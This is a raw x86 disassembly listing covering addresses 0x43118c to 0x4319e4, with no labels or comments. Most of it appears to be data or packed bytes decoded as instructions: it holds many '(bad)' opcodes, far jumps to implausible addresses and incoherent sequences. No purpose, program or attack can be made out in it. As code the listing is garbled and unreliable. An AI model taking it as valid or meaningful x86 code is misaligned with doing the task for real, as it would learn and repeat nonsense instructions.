  43118c:	add    BYTE PTR [ebx],bh
  43118e:	(bad)  
  43118f:	and    al,0x32
  431191:	jae    0x43112f
  431193:	mov    cl,cl
  431195:	inc    DWORD PTR [esp]
  431198:	push   ebp
  431199:	shr    esp,0x8
  43119c:	in     al,dx
  43119d:	push   esp
  43119e:	add    DWORD PTR [eax],esp
  4311a0:	add    bl,cl
  4311a2:	inc    ebp
  4311a3:	mov    bh,0x89
  4311a5:	add    ah,bh
  4311a7:	jmp    0xca7520f1
  4311ac:	pushf  
  4311ad:	dec    esp
  4311ae:	mov    edx,0xf8178520
  4311b3:	fst    DWORD PTR [ebp+0x0]
  4311b6:	mov    BYTE PTR [eax],0xc4
  4311b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4311bc:	inc    ebp
  4311bd:	add    eax,0xc601da
  4311c2:	mov    al,0xc6
  4311c5:	ins    BYTE PTR es:[edi],dx
  4311c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311cd:	dec    esp
  4311ce:	jmp    DWORD PTR [eax]
  4311d0:	inc    ebp
  4311d1:	fnstcw WORD PTR [esi+0x29]
  4311d4:	test   BYTE PTR [eax],0xc8
  4311d7:	rol    BYTE PTR [eax],0xc0
  4311da:	lea    ecx,[ebp-0x3cf0dbcb]
  4311e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311e6:	inc    esi
  4311e7:	add    DWORD PTR [eax],ebx
  4311e9:	add    dh,bh
  4311eb:	mov    esi,DWORD PTR [edx+0x8]
  4311ee:	(bad)  
  4311ef:	fdiv   QWORD PTR ss:[ecx]
  4311f2:	(bad)  
  4311f3:	mov    bl,ch
  4311f5:	add    esi,eax
  4311f7:	add    dh,bl
  4311f9:	or     esi,eax
  4311fb:	mov    dl,0xdf
  4311fd:	add    esi,eax
  4311ff:	add    al,ah
  431201:	push   cs
  431202:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431209:	or     BYTE PTR [ebx],dh
  43120b:	dec    ecx
  43120c:	lea    eax,[ebx]
  43120e:	xor    eax,0x18fc0fc7
  431213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431214:	repz clc 
  431216:	add    eax,DWORD PTR [ebp+0x46]
  431219:	prefetcht0 BYTE PTR [ecx-0x2]
  43121d:	xor    eax,0x7c60872
  431222:	mov    esp,0xbd32c69b
  431227:	pop    esi
  431228:	mov    cl,0xbe
  43122b:	or     al,0xc6
  43122d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431234:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43123b:	add    dh,al
  43123d:	mov    eax,ebx
  43123f:	xor    DWORD PTR [ebx],0x35008dbc
  431245:	mov    ecx,DWORD PTR [edi]
  431247:	sbb    al,0x18
  431249:	inc    ebp
  43124a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431251:	clc    
  431252:	(bad)  
  431253:	xor    DWORD PTR [edx-0x64],esi
  431256:	lea    ecx,[ecx+0x45ffe838]
  43125c:	mov    ecx,ebx
  43125e:	fadd   st,st(6)
  431260:	dec    ebp
  431261:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431267:	out    0x1,eax
  431269:	inc    ebp
  43126a:	lea    ebp,ds:0xc8ffc6ff
  431270:	enter  0xa33,0xc6
  431274:	push   ebp
  431275:	leave  
  431276:	(bad)  
  431277:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43127d:	add    BYTE PTR [ebp+0x44],al
  431280:	mov    eax,esp
  431282:	mov    WORD PTR [esi+0x46398300],?
  431288:	psubusw mm4,QWORD PTR [esi-0x78]
  43128c:	add    BYTE PTR [ebx-0x1303f975],al
  431292:	add    BYTE PTR [ebp+0x1],0xeb
  431296:	add    BYTE PTR [ebp+0x38],al
  431299:	in     eax,dx
  43129a:	inc    ebp
  43129b:	inc    ebp
  43129c:	mov    ebx,ebx
  43129e:	add    BYTE PTR [ebp+0x0],0xec
  4312a2:	mov    DWORD PTR [ebp-0x41],eax
  4312a5:	sub    eax,0x2c00454e
  4312aa:	ins    DWORD PTR es:[edi],dx
  4312ab:	inc    ebp
  4312ac:	add    BYTE PTR [esi+0x66],bh
  4312af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4312b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4312c0:	dec    edi
  4312c1:	pop    es
  4312c2:	add    ah,ch
  4312c4:	mov    DWORD PTR [ebp+0x68],eax
  4312c7:	in     eax,dx
  4312c8:	inc    DWORD PTR [ebp-0x7d]
  4312cb:	out    0xc0,al
  4312cd:	inc    ebp
  4312ce:	mov    edx,esp
  4312d0:	push   0x45
  4312d2:	(bad)  
  4312d3:	jmp    0xdf925890
  4312d8:	add    BYTE PTR [ebp-0x77],al
  4312db:	out    dx,al
  4312dc:	ins    BYTE PTR es:[edi],dx
  4312dd:	inc    ebp
  4312de:	jmp    edi
  4312e0:	add    DWORD PTR [ebp-0x14],0x7e
  4312e4:	mov    esi,esi
  4312e6:	outs   dx,BYTE PTR ds:[esi]
  4312e7:	inc    esp
  4312e8:	(bad)  
  4312e9:	mov    esp,0x8341b68d
  4312ee:	mov    DWORD PTR [esi+0x70],eax
  4312f1:	fcos   
  4312f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4312f9:	in     al,dx
  4312fa:	jb     0x431281
  4312fc:	(bad)  
  4312fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431303:	mov    edi,edi
  431305:	fdivr  st,st(7)
  431307:	out    dx,eax
  431308:	rcl    BYTE PTR [ebx],0x66
  43130b:	mov    DWORD PTR [ebp-0xc70075],eax
  431311:	(bad)  
  431312:	std    
  431313:	cmp    eax,DWORD PTR [eax]
  431315:	jne    0x43137d
  431317:	mov    DWORD PTR [ebp-0xba0048],eax
  43131d:	in     al,dx
  43131e:	outs   dx,BYTE PTR ds:[esi]
  43131f:	pushf  
  431320:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431326:	inc    DWORD PTR [ecx]
  431328:	inc    DWORD PTR [eax]
  43132a:	jae    0x431364
  43132c:	add    BYTE PTR [ebp+0x850266],al
  431332:	inc    DWORD PTR [ebp-0x1]
  431335:	mov    eax,eax
  431337:	jl     0x43139f
  431339:	add    BYTE PTR [ebp-0x740077],al
  43133f:	cld    
  431340:	dec    eax
  431341:	add    BYTE PTR [eax],0x1
  431344:	data16 add BYTE PTR [ebp+0x38],al
  431348:	mov    eax,0x47c2
  43134d:	mov    eax,0x824f89
  431352:	inc    edi
  431353:	mov    DWORD PTR [edx+0x64],ebp
  431356:	inc    WORD PTR [ebp-0x75]
  43135a:	(bad)  
  43135b:	data16 rol BYTE PTR [ebp-0x16001a],1
  431362:	inc    ebp
  431363:	jge    0x431344
  431365:	add    bh,ah
  431367:	lea    ax,[ebp-0x750030]
  43136e:	add    al,0x46
  431371:	jmp    0x40ff:0x8885
  431377:	push   DWORD PTR [ebp+0x52]
  43137a:	lea    eax,[eax]
  43137c:	shl    BYTE PTR [esi-0x7b],1
  43137f:	test   esi,edi
  431381:	(bad)  
  431382:	(bad)  
  431383:	inc    DWORD PTR [ebp-0x990140]
  431389:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43138f:	inc    edi
  431390:	push   ecx
  431391:	xor    ax,WORD PTR [ebp-0x8d0045]
  431398:	add    al,al
  43139a:	ret    
  43139b:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313a2:	push   eax
  4313a3:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313aa:	add    BYTE PTR [ebx-0x764f8839],al
  4313b0:	push   DWORD PTR [esi+0x1]
  4313b3:	inc    DWORD PTR [eax]
  4313b5:	mov    eax,0xff99ff
  4313ba:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313c0:	jne    0x43137a
  4313c2:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313cc:	mov    ecx,0xd74fb8
  4313d1:	add    cl,al
  4313d3:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313d9:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313e0:	(bad)  
  4313e1:	push   ebp
  4313e3:	mov    eax,0x8c2789
  4313e8:	ret    0x6689
  4313eb:	adc    BYTE PTR [ebp+0x48],0x8d
  4313ef:	add    bh,ah
  4313f1:	mov    WORD PTR [ebp-0x70],ax
  4313f5:	(bad)  
  4313f6:	ret    0x667d
  4313f9:	or     BYTE PTR [ebp-0x77],dl
  4313fc:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431403:	loop   0x43138e
  431405:	(bad)  
  431406:	xchg   esi,eax
  431407:	aam    0xcf
  431409:	out    dx,al
  43140a:	mov    DWORD PTR [esi-0x68],edi
  43140d:	inc    ebp
  43140e:	dec    edx
  43140f:	pop    ecx
  431410:	mov    edx,DWORD PTR [eax]
  431412:	repnz push bp
  431415:	or     BYTE PTR [ebx+0x55106638],0x49
  43141c:	(bad)  
  43141d:	repnz xor eax,0xa0898945
  431423:	mov    ah,0x89
  431425:	jmp    DWORD PTR [edx+0x66b0418d]
  43142b:	inc    DWORD PTR [ebp+0x50]
  43142e:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431432:	mov    DWORD PTR [eax],ecx
  431434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431435:	pop    es
  431436:	inc    ecx
  431437:	(bad)  
  431438:	data16 fwait
  43143a:	inc    ebp
  43143b:	xor    ah,BYTE PTR [esi+0x3]
  43143e:	dec    ebp
  43143f:	push   eax
  431440:	inc    bp
  431442:	jge    0x4313c7
  431444:	mov    esp,DWORD PTR [esi-0x18]
  431447:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  43144d:	add    DWORD PTR [ebx],esi
  43144f:	add    BYTE PTR [ebx],al
  431451:	test   DWORD PTR [ebx],esi
  431453:	(bad)  
  431454:	inc    WORD PTR [ebp+0x0]
  431458:	mov    eax,DWORD PTR [eax]
  43145a:	call   0x8898cb8f
  43145f:	mov    esi,eax
  431461:	clc    
  431462:	ret    
  431463:	rol    cl,0xa
  431466:	mov    DWORD PTR ds:0x7c0ec88,esi
  43146c:	mov    edx,edi
  43146e:	pushf  
  43146f:	pop    es
  431470:	jmp    FWORD PTR [edx+0x66]
  431473:	add    BYTE PTR [ebp-0x990175],al
  431479:	inc    ebp
  43147a:	test   DWORD PTR [ebx-0x2f00f202],eax
  431480:	push   ebp
  431481:	mov    edi,eax
  431483:	mov    dh,BYTE PTR [eax+0x266ff51]
  431489:	push   ebp
  43148a:	add    BYTE PTR [ebx-0x764b0777],al
  431490:	dec    DWORD PTR [esi+0x661851e8]
  431496:	add    BYTE PTR [ebp-0x7b],dl
  431499:	cmp    esi,0xfffffffb
  43149c:	dec    DWORD PTR [ecx+0x51fe9285]
  4314a2:	jmp    DWORD PTR [esi-0x75]
  4314a5:	push   ebp
  4314a6:	hlt    
  4314a7:	data16 (bad) 
  4314a9:	dec    ebp
  4314aa:	ret    
  4314ab:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314b1:	lea    edx,[eax-0x1]
  4314b4:	jne    0x431487
  4314b6:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314bc:	dec    BYTE PTR [ecx+0x51559eff]
  4314c2:	mov    DWORD PTR [esi-0x4c],esp
  4314c5:	push   ebp
  4314c6:	jmp    DWORD PTR [esi-0x18]
  4314c9:	inc    ebp
  4314ca:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314d0:	(bad)  
  4314d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314d2:	inc    eax
  4314d4:	test   DWORD PTR [esi-0x2],esp
  4314d7:	inc    ebp
  4314d8:	dec    DWORD PTR [ebp-0x760bde75]
  4314de:	(bad)  
  4314df:	test   al,0xc3
  4314e1:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314e7:	lods   al,BYTE PTR ds:[esi]
  4314e8:	push   eax
  4314e9:	inc    ebp
  4314ea:	jne    0x4314fb
  4314ec:	dec    DWORD PTR [ebp+0x8]
  4314ef:	mov    ecx,DWORD PTR [ebx]
  4314f1:	sbb    al,0x0
  4314f3:	(bad)  
  4314f4:	mov    eax,0xc14fc3
  4314f9:	mov    DWORD PTR [ecx-0xbabf64],ecx
  4314ff:	movsx  ecx,WORD PTR [ebp+0x4e]
  431503:	xor    eax,DWORD PTR [eax]
  431505:	add    eax,edi
  431507:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43150d:	xor    edi,DWORD PTR [eax+0x854f66]
  431513:	dec    BYTE PTR [ecx-0x76bb01]
  431519:	mov    BYTE PTR [ebx-0x76724001],al
  43151f:	pushf  
  431520:	inc    esi
  431521:	(bad)  
  431522:	dec    DWORD PTR [ebp-0x7abe6373]
  431528:	sar    esi,0x89
  43152b:	dec    DWORD PTR [eax+0x0]
  43152e:	inc    DWORD PTR [eax]
  431530:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  431537:	xlat   BYTE PTR ds:[ebx]
  431538:	dec    edx
  431539:	add    bh,bh
  43153b:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431541:	lea    esp,[esi-0x50]
  431544:	(bad)  
  431545:	(bad)  
  431546:	call   DWORD PTR [eax-0x1]
  431549:	inc    ebp
  43154a:	rdpmc  
  43154c:	add    BYTE PTR [ebx],al
  43154e:	push   ax
  431550:	lea    eax,[ebp-0x1]
  431556:	js     0x431557
  431558:	add    al,bh
  43155a:	push   bp
  43155c:	lea    ecx,[ebp-0x7701]
  431562:	fmul   DWORD PTR [ebp-0x7a997800]
  431568:	(bad)  
  431569:	(bad)  
  43156a:	(bad)  
  43156b:	(bad)  
  43156c:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431572:	dec    eax
  431573:	mov    eax,0x8d8dffff
  431578:	mov    al,0xb0
  43157a:	(bad)  
  43157b:	call   DWORD PTR [ecx+0x50]
  43157e:	dec    ebp
  43157f:	inc    ebp
  431580:	mov    esi,0x7030833
  431585:	push   eax
  431586:	into   
  431587:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43158d:	call   DWORD PTR [ecx-0x8]
  431590:	lea    edx,[ebp-0x1]
  431593:	jmp    0x761797
  431598:	inc    eax
  431599:	jnp    0x431528
  43159b:	add    dh,bh
  43159d:	inc    WORD PTR [ebp-0x8a00b0]
  4315a4:	mov    edx,eax
  4315a6:	inc    esp
  4315a7:	add    bh,bh
  4315a9:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315af:	dec    DWORD PTR [ebx-0x7f820301]
  4315b5:	add    BYTE PTR [ecx],al
  4315b7:	data16 add BYTE PTR [ebp-0xb30077],al
  4315be:	inc    eax
  4315c0:	(bad)  
  4315c1:	dec    si
  4315c3:	test   edi,edi
  4315c5:	(bad)  
  4315c6:	cmp    edi,edi
  4315c8:	add    ecx,DWORD PTR [edi-0x39]
  4315cb:	mov    edx,DWORD PTR [edx+0x66]
  4315ce:	inc    DWORD PTR [ebp-0x3d00cb]
  4315d4:	mov    eax,0x66ff8b5e
  4315da:	jmp    0xb4ff:0xc7ff3895
  4315e1:	push   ecx
  4315e2:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315e8:	call   DWORD PTR [esi-0x1]
  4315eb:	dec    DWORD PTR [eax]
  4315ed:	mov    ecx,0x805ff
  4315f2:	inc    ebp
  4315f3:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  4315f9:	mov    ecx,0x35784
  4315fe:	add    BYTE PTR [ecx-0xffa59b],cl
  431604:	inc    ebp
  431605:	mov    ecx,0x9c6131
  43160a:	(bad)  
  43160b:	mov    eax,ebx
  43160d:	pop    esp
  43160e:	test   edi,edi
  431610:	clc    
  431611:	lea    eax,[ebp-0x24]
  431614:	cmp    eax,0xc7fe9c8d
  431619:	push   eax
  43161b:	lea    eax,[ebp+0x45fff8fe]
  431621:	mov    esi,DWORD PTR [ecx]
  431623:	hlt    
  431624:	lahf   
  431625:	push   esp
  431626:	mov    edx,DWORD PTR [ecx-0x4]
  431629:	xor    eax,DWORD PTR [eax+0x7201bb]
  43162f:	add    BYTE PTR [ebp-0x35],al
  431632:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  431638:	mov    edx,DWORD PTR [ecx-0x74]
  43163b:	rol    BYTE PTR [eax],0x8d
  43163e:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431642:	nop
  431643:	push   ecx
  431644:	add    bh,bh
  431646:	mov    esp,edi
  431648:	in     al,0x85
  43164a:	jge    0x43164a
  43164c:	test   edi,edi
  43164e:	jne    0x4315d5
  431650:	(bad)  
  431651:	(bad)  
  431652:	sbb    bh,bh
  431654:	push   ebp
  431655:	inc    ebp
  431656:	call   0xffdc10e6
  43165b:	add    BYTE PTR [ebp+0x66],al
  43165e:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431664:	cmp    al,0x85
  431666:	ud0    eax,DWORD PTR [ebp-0x1]
  43166a:	test   DWORD PTR [edi+0x74],ecx
  43166d:	dec    edi
  43166e:	inc    DWORD PTR [ebp-0x530004]
  431674:	dec    DWORD PTR [edi-0x75]
  431677:	dec    esi
  431678:	cld    
  431679:	test   DWORD PTR [eax+0xff01ff],eax
  43167f:	icebp  
  431680:	add    BYTE PTR [edi-0x3a],cl
  431683:	test   ebx,eax
  431685:	inc    BYTE PTR [ebp-0x1]
  431688:	jne    0x43168a
  43168a:	mov    eax,DWORD PTR [eax]
  43168c:	cld    
  43168d:	xor    BYTE PTR [ecx+0x500155],cl
  431693:	push   ebp
  431694:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43169a:	add    BYTE PTR [ebp+0x35e90f50],al
  4316a0:	add    al,BYTE PTR [eax]
  4316a2:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316a8:	add    ah,ch
  4316aa:	or     BYTE PTR [ebp+0x4501f845],dh
  4316b0:	jmp    0xdf19a6
  4316b5:	(bad)  
  4316b6:	nop    ecx
  4316b9:	test   DWORD PTR [ebp+0x4502f8],eax
  4316bf:	xor    ecx,DWORD PTR [ebp-0x64]
  4316c2:	mov    eax,edi
  4316c4:	mov    ebx,DWORD PTR [eax+edx*2]
  4316c7:	add    eax,0x45fef885
  4316cc:	dec    DWORD PTR [ebx+0x339445]
  4316d2:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316d8:	dec    DWORD PTR [ebx-0x460f0375]
  4316de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316df:	add    esi,edi
  4316e1:	add    bh,bh
  4316e3:	rdpmc  
  4316e5:	add    BYTE PTR [ebx],0x1
  4316e8:	mov    DWORD PTR [eax],eax
  4316ea:	add    al,0x45
  4316ec:	dec    DWORD PTR [ecx-0x360b3373]
  4316f2:	dec    DWORD PTR [esi]
  4316f4:	push   eax
  4316f5:	jne    0x43173c
  4316f7:	mov    esi,DWORD PTR [ebx]
  4316f9:	cld    
  4316fa:	add    esp,ecx
  4316fc:	push   eax
  4316fd:	inc    DWORD PTR [ebp-0x75]
  431700:	add    eax,0x800e4
  431705:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43170b:	mov    DWORD PTR [ecx],eax
  43170d:	sbb    al,0x0
  43170f:	leave  
  431710:	test   DWORD PTR [edi-0x2],eax
  431713:	jne    0x431714
  431715:	call   0xff44011a
  43171a:	xor    BYTE PTR [ebp+0x4d],al
  43171d:	mov    edi,edi
  43171f:	enter  0x8,0x4d
  431723:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  431729:	mov    eax,DWORD PTR [eax]
  43172b:	cld    
  43172c:	add    DWORD PTR [ecx],ebx
  43172e:	inc    ebp
  43172f:	dec    ebp
  431730:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  431736:	inc    eax
  431737:	dec    DWORD PTR [ecx-0x270375]
  43173d:	add    BYTE PTR [ebx-0x39d72701],cl
  431743:	xchg   ecx,eax
  431744:	ret    
  431745:	add    BYTE PTR [ebp-0x830075],al
  43174b:	add    BYTE PTR [ebp-0x75],al
  43174e:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431754:	lea    edi,[edi-0xc]
  431757:	add    bh,bh
  431759:	mov    edx,DWORD PTR [eax-0x7b]
  43175c:	inc    ebp
  43175d:	rdpmc  
  43175f:	jne    0x431764
  431761:	add    BYTE PTR [eax-0x75],dl
  431764:	inc    ebp
  431765:	clc    
  431766:	add    eax,0x400009
  43176b:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431771:	mov    eax,DWORD PTR [ecx]
  431773:	in     al,dx
  431774:	add    dh,al
  431776:	test   ebx,eax
  431778:	inc    BYTE PTR [ebp-0xff0001]
  43177e:	add    BYTE PTR [ebp-0x43],al
  431781:	cmp    esi,0xfffffff8
  431784:	(bad)  
  431785:	push   DWORD PTR [eax]
  431787:	add    BYTE PTR [ebp-0x3a],dl
  43178a:	test   ebx,eax
  43178c:	je     0x431713
  43178e:	mov    edi,edi
  431790:	sbb    al,0xff
  431792:	test   DWORD PTR gs:[eax],eax
  431795:	(bad)  
  431796:	js     0x431797
  431798:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43179e:	sub    eax,ebx
  4317a0:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317a6:	add    eax,DWORD PTR [eax]
  4317a8:	dec    ebp
  4317a9:	push   eax
  4317aa:	mov    al,BYTE PTR [ebp+0x1]
  4317ad:	mov    eax,DWORD PTR [ebp-0x68]
  4317b0:	mov    eax,DWORD PTR [eax]
  4317b2:	sbb    bh,al
  4317b4:	or     ah,dh
  4317b6:	dec    ebp
  4317b7:	inc    DWORD PTR [eax+0x4]
  4317ba:	push   ecx
  4317bb:	add    BYTE PTR [edx-0x1],dh
  4317be:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317c4:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317ce:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317d4:	push   ecx
  4317d5:	cmp    BYTE PTR [ebx],al
  4317d7:	inc    ebp
  4317d8:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317de:	(bad)  
  4317df:	(bad)  
  4317e0:	in     al,0xff
  4317e2:	add    BYTE PTR [ebp+0x0],al
  4317e5:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317eb:	add    al,bh
  4317ed:	(bad)  
  4317ee:	jmp    0x8d85:0x74b0558d
  4317f5:	dec    DWORD PTR [eax]
  4317f7:	call   DWORD PTR [ebp-0x7b]
  4317fa:	mov    edi,esi
  4317fc:	lock call DWORD PTR [ebp-0x75]
  431800:	mov    esi,esp
  431802:	mov    ah,0xc6
  431804:	mov    bh,0xc3
  431806:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43180c:	add    DWORD PTR [eax],0x450050ff
  431812:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431818:	inc    edi
  43181a:	push   esp
  43181c:	jmp    0xcd00:0x650481ff
  431823:	mov    DWORD PTR [ebx],esi
  431825:	clc    
  431826:	cmp    edi,0xff9cff3c
  43182c:	jne    0x431836
  43182e:	mov    eax,eax
  431830:	add    esi,DWORD PTR [eax]
  431832:	int3   
  431833:	inc    ebp
  431834:	cmp    al,0x83
  431836:	add    BYTE PTR [eax],bl
  431838:	adc    DWORD PTR [ebx+0x768b5055],eax
  43183e:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431844:	mov    edi,eax
  431846:	cmp    BYTE PTR [ebp+0x45],cl
  431849:	jmp    0x4317d6
  43184b:	mov    ebx,DWORD PTR [esp+ebp*8]
  43184e:	inc    ebp
  43184f:	or     al,0x2
  431851:	dec    DWORD PTR [ebp+0x18]
  431854:	jne    0x4318ab
  431856:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  43185c:	mov    edi,DWORD PTR [ebx]
  43185e:	in     al,0x50
  431860:	xchg   ecx,eax
  431861:	jmp    0x3436766
  431866:	adc    al,0x8b
  431868:	inc    ebp
  431869:	mov    al,ds:0x8b04008b
  43186e:	push   ebp
  43186f:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431875:	push   ebp
  431876:	test   DWORD PTR [ebx-0x2800d701],ecx
  43187c:	inc    ebp
  43187d:	dec    ebp
  43187e:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431884:	mov    DWORD PTR [eax],0xe9ff00f4
  43188a:	add    al,0x0
  43188c:	add    BYTE PTR [eax],al
  43188e:	mov    eax,edx
  431890:	push   eax
  431891:	rol    DWORD PTR [ebp-0xf0177],1
  431897:	bound  eax,QWORD PTR [ebp+0x50]
  43189a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318a0:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318a6:	mov    al,0xf
  4318a8:	test   DWORD PTR [edx],edx
  4318aa:	call   DWORD PTR [ebp-0x7a0001]
  4318b0:	(bad)  
  4318b1:	loop   0x4318b2
  4318b3:	jnp    0xc6990cb9
  4318b9:	mov    eax,ebx
  4318bb:	cmp    al,0x8b
  4318bd:	(bad)  
  4318be:	cld    
  4318bf:	shr    esi,0xc
  4318c2:	add    dl,al
  4318c4:	push   eax
  4318c5:	lea    eax,[ebp-0x1]
  4318c8:	mov    edx,esi
  4318ca:	cwde   
  4318cb:	cli    
  4318cc:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318d2:	or     BYTE PTR [eax],cl
  4318d4:	inc    ebp
  4318d5:	dec    ebp
  4318d6:	inc    DWORD PTR [ebx+0x74803914]
  4318dc:	add    DWORD PTR [ebx+0x451800],ecx
  4318e2:	call   DWORD PTR [eax+edx*1]
  4318e5:	add    ecx,DWORD PTR [ebp-0x34]
  4318e8:	push   edi
  4318e9:	adc    al,0x8
  4318eb:	mov    edx,DWORD PTR [ebp-0x14]
  4318ee:	mov    ecx,DWORD PTR [ebp+0x18]
  4318f1:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4318f5:	inc    DWORD PTR [eax+esi*8]
  4318f8:	inc    ebp
  4318f9:	stos   BYTE PTR es:[edi],al
  4318fa:	mov    edx,DWORD PTR [ebp-0x4]
  4318fd:	add    DWORD PTR [ebp-0x1c],eax
  431900:	mov    edx,DWORD PTR [ebp-0x70]
  431903:	cmp    eax,DWORD PTR [eax]
  431905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431906:	mov    eax,DWORD PTR [eax]
  431908:	cld    
  431909:	jae    0x43188b
  43190b:	add    eax,DWORD PTR [ecx]
  43190d:	clc    
  43190e:	add    BYTE PTR [eax+0x30],dl
  431911:	mov    DWORD PTR [ecx],esi
  431913:	clc    
  431914:	pop    ds
  431915:	inc    ebp
  431916:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43191c:	(bad)  
  43191d:	push   DWORD PTR [edi]
  43191f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431925:	(bad)  
  431926:	jae    0x431927
  431928:	mov    eax,DWORD PTR [ebp-0x740175]
  43192e:	sub    eax,DWORD PTR [eax]
  431930:	add    eax,DWORD PTR [eax]
  431932:	mov    DWORD PTR [ecx+0x5f],eax
  431935:	mov    DWORD PTR [ebx-0x4],ebx
  431938:	ret    0xff
  43193b:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431941:	ret    
  431942:	mov    eax,DWORD PTR [ebp-0x6f0075]
  431948:	add    BYTE PTR [ebp-0x7d],al
  43194b:	mov    DWORD PTR [eax],eax
  43194d:	add    al,0x84
  43194f:	inc    DWORD PTR [ecx]
  431951:	lea    eax,[eax]
  431953:	hlt    
  431954:	sar    bh,cl
  431956:	test   BYTE PTR [eax+0x1],dl
  431959:	inc    ebp
  43195a:	add    BYTE PTR [ebx],dh
  43195c:	test   BYTE PTR [ebx],0x84
  43195f:	push   eax
  431960:	add    BYTE PTR [ebp+0x0],al
  431963:	add    eax,0x86
  431968:	add    BYTE PTR [ebx-0x7f7b0340],cl
  43196e:	add    BYTE PTR [ecx],al
  431970:	add    BYTE PTR [eax],al
  431972:	mov    esi,0x550030
  431977:	mov    ecx,DWORD PTR [edi]
  431979:	cld    
  43197a:	fidiv  DWORD PTR [ebp+0x0]
  43197d:	mov    edi,DWORD PTR [ecx]
  43197f:	xor    BYTE PTR [eax+eax*1],0x84
  431983:	add    eax,DWORD PTR [eax]
  431985:	sbb    BYTE PTR [eax],al
  431987:	jne    0x43193a
  431989:	mov    eax,DWORD PTR [ecx]
  43198b:	sbb    BYTE PTR [eax],al
  43198d:	mov    DWORD PTR [ebp-0x1],esp
  431990:	add    BYTE PTR [eax+0x30e45ca],bh
  431996:	ret    0xb7fc
  431999:	dec    ebp
  43199a:	or     al,0x89
  43199c:	dec    ebp
  43199d:	cld    
  43199e:	cmovne ecx,DWORD PTR [eax-0x75]
  4319a2:	add    edi,esp
  4319a4:	seto   BYTE PTR [esi-0x72ffffff]
  4319ab:	inc    ebp
  4319ac:	adc    al,0x8b
  4319ae:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319b5:	cmp    DWORD PTR [edi+0x72],edx
  4319b8:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319be:	gs cmp al,0x0
  4319c1:	je     0x431999
  4319c3:	push   eax
  4319c4:	sar    BYTE PTR [eax],1
  4319c6:	mov    bh,0x3e
  4319c8:	push   cs
  4319c9:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319cf:	add    DWORD PTR [ecx+0x12],ebp
  4319d2:	dec    edx
  4319d3:	(bad)  
  4319d4:	mov    eax,edx
  4319d6:	in     al,dx
  4319d7:	adc    DWORD PTR [ecx],esi
  4319d9:	pop    esi
  4319da:	inc    ecx
  4319db:	leave  
  4319dc:	or     DWORD PTR [eax],ebx
  4319de:	gs push ebp
  4319e0:	add    ah,ch
  4319e2:	into   
  4319e3:	in     al,dx
  4319e4:	enter  0xb756,0xf0
